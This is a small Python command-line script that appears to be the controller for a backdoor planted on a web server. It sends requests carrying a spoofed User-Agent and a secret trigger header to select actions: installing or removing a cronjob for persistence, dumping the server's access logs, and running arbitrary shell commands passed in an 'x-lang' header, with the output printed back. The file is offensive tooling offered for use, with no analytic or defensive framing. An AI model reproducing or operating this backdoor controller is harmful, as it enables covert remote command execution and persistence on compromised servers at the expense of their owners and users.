import requests
import sys
commands = {
	"help": "Display commands",
	"cronjob": "Will add a cronjob to the system if it does not already exists.",
	"clean_cron": "Remove Cronjob from system.",
	"access.log": "Will read web server logs"
}
if not len(sys.argv) >= 2:
	exit

def make_requests(cmd, extra=None):
	host = "http://localhost"
	headers = {
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
		"Sourpatchkids": "sourpatchkids",
		"API-Key": cmd
	}
	if cmd == "cmd":
		headers["x-lang"] = extra
	try: 
		rsp  = requests.get(host, headers=headers)
		print(f"{cmd} has been ran.") 
		if cmd == "access.log" or cmd == "cmd":
			print(rsp.text)
	except:
		print(f"{cmd} has been ran.") 


if sys.argv[1] == "help":
	print("command  || Description")
	print("=============================")
	for cmd, description in commands.items():
		print(f"{cmd}   {description}", sep="   ")

elif sys.argv[1] == "clean_cron":
	make_requests(sys.argv[1])
elif sys.argv[1] == "cronjob":
	make_requests(sys.argv[1])
elif sys.argv[1] == "access.log":
	make_requests(sys.argv[1])
elif sys.argv[1] == "cmd":
	if len(sys.argv) == 3:
		print(f"Running the: {sys.argv[2]}")
		make_requests(sys.argv[1], extra=sys.argv[2])
	else:
		print('You need to provide a command. If the command has multiple spaces you ca use ""')